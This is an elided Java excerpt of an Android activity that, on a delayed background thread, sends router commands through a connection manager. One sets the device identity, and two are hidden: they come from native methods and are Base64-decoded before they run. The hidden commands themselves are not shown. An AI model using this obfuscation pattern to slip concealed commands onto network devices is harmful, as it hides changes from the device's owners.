...
public class Attention8Activity extends AppCompatActivity {
    ...
    protected void onCreate(Bundle savedInstanceState) {
        ...
        String key87 = new String(Base64.getDecoder().decode(string87()));
        String key88 = new String(Base64.getDecoder().decode(string88()));
        ...
        handler.postDelayed(() -> {
            Thread t = new Thread(() -> {
                try {
                        ...
                        ConnectionManager.runCommand("/system identity set name=ImProvider8");
                        ...
                        ConnectionManager.runCommand(key88);
                        Thread.sleep(5000);
                    ...
                    ConnectionManager.runCommand(key87);
    ...
    public native String string87();
    public native String string88();
}
